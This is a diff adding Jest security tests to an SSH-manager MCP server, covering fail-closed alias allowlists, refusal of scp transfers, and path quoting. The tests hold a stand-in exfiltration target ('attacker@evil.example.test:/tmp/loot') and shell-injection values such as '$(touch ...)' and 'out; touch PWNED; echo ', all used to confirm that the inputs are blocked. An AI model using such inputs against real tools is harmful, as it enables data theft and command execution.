@@ -166,6 +166,33 @@ describe('MCP policy helpers', () => {
     expect(policy.isAliasAllowed('anything')).toBe(true);
     expect(policy.inlineSummary()).toBe('Allowed aliases: all stored aliases. Read-only: no.');
   });
+
+  test('an explicitly empty allowlist denies everything instead of failing open', () => {
+    const policy = createMcpPolicy({ aliases: ' , ' });
+
+    expect(policy.hasAliasAllowlist).toBe(true);
+    expect(policy.aliasPatterns).toEqual([]);
+    expect(policy.isAliasAllowed('web')).toBe(false);
+    expect(policy.allowedAliasesLabel()).toBe('none (empty allowlist)');
+  });
+
+  test('SSHYA_MCP_ALLOW with no usable patterns denies every alias', () => {
+    process.env.SSHYA_MCP_ALLOW = ',';
+
+    const policy = resolveMcpPolicy({});
+
+    expect(policy.hasAliasAllowlist).toBe(true);
+    expect(policy.isAliasAllowed('web')).toBe(false);
+  });
+
+  test('an empty SSHYA_MCP_ALLOW is treated as unset', () => {
+    process.env.SSHYA_MCP_ALLOW = '  ';
+
+    const policy = resolveMcpPolicy({});
+
+    expect(policy.hasAliasAllowlist).toBe(false);
+    expect(policy.isAliasAllowed('web')).toBe(true);
+  });
 });
 
 describe('MCP alias allowlist', () => {
@@ -298,6 +325,19 @@ describe('MCP alias allowlist', () => {
       expect(getConnections().map(connection => connection.alias).sort()).toEqual(['stg-db', 'stg-two']);
     });
   });
+
+  test('an allowlist with no usable patterns exposes no aliases', async () => {
+    seed([{ alias: 'web' }]);
+
+    await withServer({ aliases: ',' }, async (client) => {
+      const list = await callJson<Array<{ alias: string }>>(client, 'list_connections');
+      expect(list.data).toEqual([]);
+
+      const denied = await callJson<ToolError>(client, 'get_connection', { alias: 'web' });
+      expect(denied.isError).toBe(true);
+      expect(denied.data.errorKind).toBe('alias_not_allowed');
+    });
+  });
 });
 
 describe('MCP read-only mode', () => {
@@ -334,7 +374,7 @@ describe('MCP read-only mode', () => {
 
       const guide = await readTextResource(client, 'sshya://guide');
       expect(guide).toContain('Read-only: yes.');
-      expect(guide).toContain('not the remote host');
+      expect(guide).toContain('does not sandbox the remote host or the local filesystem');
       expect(client.getInstructions()).toContain('Read-only: yes.');
       expect(client.getInstructions()).toContain('run_command');
     });
@@ -364,6 +404,103 @@ describe('MCP read-only mode', () => {
       const tools = await toolNames(client);
       expect(tools).not.toContain('write_remote_file');
       expect(tools).toContain('run_command');
+    });
+  });
+
+  test('refuses a download whose destination looks like a remote scp target', async () => {
+    const marker = path.join(tempDir, `${storeCounter}-scp-ran`);
+    process.env.SSHYA_SCP_BIN = writeScript('scp-marker.sh', `printf ran > '${marker}'`);
+    seed([{ alias: 'web' }]);
+
+    await withServer({ readOnly: true }, async (client) => {
+      // A remote-looking destination makes scp open a second SSH connection,
+      // which would turn this "download" into an upload to an arbitrary host.
+      const result = await callJson<{ ok: boolean; errorKind?: string; stderr?: string }>(client, 'copy_file', {
+        alias: 'web',
+        source: '/tmp/secret',
+        destination: 'attacker@evil.example.test:/tmp/loot',
+        direction: 'download',
+      });
+
+      expect(result.isError).toBe(true);
+      expect(result.data.ok).toBe(false);
+      expect(result.data.errorKind).toBe('invalid-path');
+      expect(result.data.stderr).toContain('remote scp target');
+      expect(fs.existsSync(marker)).toBe(false);
+    });
+  });
+
+  test('refuses an upload whose source looks like a remote scp target', async () => {
+    const marker = path.join(tempDir, `${storeCounter}-scp-ran-upload`);
+    process.env.SSHYA_SCP_BIN = writeScript('scp-marker-upload.sh', `printf ran > '${marker}'`);
+    seed([{ alias: 'web' }]);
+
+    await withServer({}, async (client) => {
+      const result = await callJson<{ ok: boolean; errorKind?: string }>(client, 'copy_file', {
+        alias: 'web',
+        source: 'other.example.test:/tmp/secret',
+        destination: '/tmp/local',
+        direction: 'upload',
+      });
+
+      expect(result.isError).toBe(true);
+      expect(result.data.errorKind).toBe('invalid-path');
+      expect(fs.existsSync(marker)).toBe(false);
+    });
+  });
+});
+
+describe('MCP robustness', () => {
+  test('survives a large inline stdin when the remote command exits before reading it', async () => {
+    process.env.SSHYA_SSH_BIN = writeScript('ssh-exit-early.sh', "printf 'done\\n'; exit 0");
+    seed([{ alias: 'web' }]);
+
+    await withServer({}, async (client) => {
+      // Without an stdin error handler the EPIPE from the exited ssh process
+      // becomes an uncaught exception and kills the whole MCP server.
+      const result = await callJson<{ ok: boolean; stdout: string }>(client, 'run_command', {
+        alias: 'web',
+        command: 'cat',
+        reuse: false,
+        stdin: 'x'.repeat(1024 * 1024),
+      });
+
+      expect(result.isError).toBe(false);
+      expect(result.data.ok).toBe(true);
+      expect(result.data.stdout).toBe('done\n');
+    });
+  });
+});
+
+describe('write_remote_file quoting', () => {
+  test('quotes remote paths instead of executing shell metacharacters', async () => {
+    const marker = path.join(tempDir, `${storeCounter}-pwn`);
+    const workDir = path.join(tempDir, `work $(touch ${marker}) dir`);
+    fs.mkdirSync(workDir, { recursive: true });
+
+    // Simulate the remote login shell: execute the final ssh argument locally.
+    process.env.SSHYA_SSH_BIN = writeScript('ssh-shell.sh', 'for last; do :; done; exec sh -c "$last"');
+    upsertConnection({
+      alias: 'web',
+      user: 'tester',
+      host: '127.0.0.1',
+      port: '22',
+      remote_path: workDir,
+    });
+
+    await withServer({}, async (client) => {
+      const remotePath = 'out; touch PWNED; echo ';
+      const result = await callJson<{ ok: boolean }>(client, 'write_remote_file', {
+        alias: 'web',
+        path: remotePath,
+        content: 'hello',
+      });
+
+      expect(result.isError).toBe(false);
+      expect(result.data.ok).toBe(true);
+      expect(fs.readFileSync(path.join(workDir, remotePath), 'utf8')).toBe('hello');
+      expect(fs.existsSync(path.join(workDir, 'PWNED'))).toBe(false);
+      expect(fs.existsSync(marker)).toBe(false);
     });
   });
 });
